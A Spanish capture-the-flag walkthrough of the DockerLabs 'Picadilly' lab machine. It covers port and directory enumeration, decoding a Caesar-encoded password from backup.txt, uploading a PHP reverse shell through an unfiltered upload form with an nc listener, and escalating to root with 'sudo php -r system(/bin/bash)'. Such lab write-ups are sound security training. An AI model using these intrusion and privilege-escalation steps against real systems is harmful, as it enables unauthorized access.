## Introducción

Este documento presenta la resolución completa de la máquina **Picadilly**, desarrollada por *kaikoperez* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
El laboratorio expone un servidor web que contiene un archivo `backup.txt` con credenciales cifradas mediante un cifrado César y un formulario de subida de archivos en HTTPS. Tras decodificar las credenciales, se accede al usuario `mateo` vía `su`, pero la explotación inicial se realiza mediante la subida de una reverse shell en PHP para obtener acceso como `www-data`.
Desde allí, se utiliza `su mateo` con las credenciales obtenidas. Finalmente, se identifica una configuración insegura de `sudo` que permite ejecutar `php` como root sin autenticación, facilitando la escalada de privilegios a `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Picadilly.zip
sudo bash auto_deploy.sh Picadilly.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Picadilly/{content,exploits,nmap,scripts}
cd Picadilly
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **80/tcp** — HTTP
* **443/tcp** — HTTPS

![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1762745209/Ports_i0n7px.png)

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p80,443 172.17.0.2 -oN targeted
```

---

### 1.3 Enumeración web (HTTP - puerto 80)

Se realiza un escaneo de directorios:

```bash
gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1762745207/Gobuster_nrchg1.png)

**Recurso identificado:**
- `backup.txt`

![Backup](https://res.cloudinary.com/dewqswzke/image/upload/v1762745207/backup.txt_mxz44r.png)

El archivo contiene un usuario válido y una contraseña cifrada mediante **cifrado César**.

---

### 1.4 Enumeración web (HTTPS - puerto 443)

Se repite el escaneo contra el servicio HTTPS:

```bash
gobuster dir -u https://172.17.0.2/ -k \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt,js -t 200
```

![Gobuster2](https://res.cloudinary.com/dewqswzke/image/upload/v1762745207/Gobuster2_n0ltcv.png)

**Rutas encontradas:**
- `index.php` — Formulario de subida de archivos.
  ![Index 443](https://res.cloudinary.com/dewqswzke/image/upload/v1762745208/index443_gz5pip.png)
- `uploads/` — Directorio accesible que lista archivos subidos.

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Subida de reverse shell

El formulario de subida permite cargar archivos sin filtros adecuados. Se sube una reverse shell en PHP.

Se inicia un listener en la máquina atacante:

```bash
nc -nlvp 443
```

Se sube la shell y se accede a ella:

```
https://172.17.0.2/uploads/shell.php
```

![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1762745209/RevShell_iddvy8.png)

Se obtiene acceso como **www-data**.

---

## Paso 3 — Escalada de privilegios

### 3.1 De www-data → mateo

Con las credenciales decodificadas de `backup.txt`, se cambia al usuario `mateo`:

```bash
su mateo
```

![Mateo](https://res.cloudinary.com/dewqswzke/image/upload/v1762745208/Mateo_ifd6qr.png)

### 3.2 De mateo → root

Se verifican los permisos sudo:

```bash
sudo -l
```

![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1762745210/Sudo-l_gx7hlj.png)

El usuario puede ejecutar `php` como root sin contraseña.

Se utiliza `searchbins` para verificar la técnica en GTFOBins:

```bash
searchbins -b php -f sudo
```

Se ejecuta el siguiente comando para obtener una shell con privilegios de root:

```bash
sudo php -r "system('/bin/bash');"
```

![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1762745210/Root_m4867t.png)
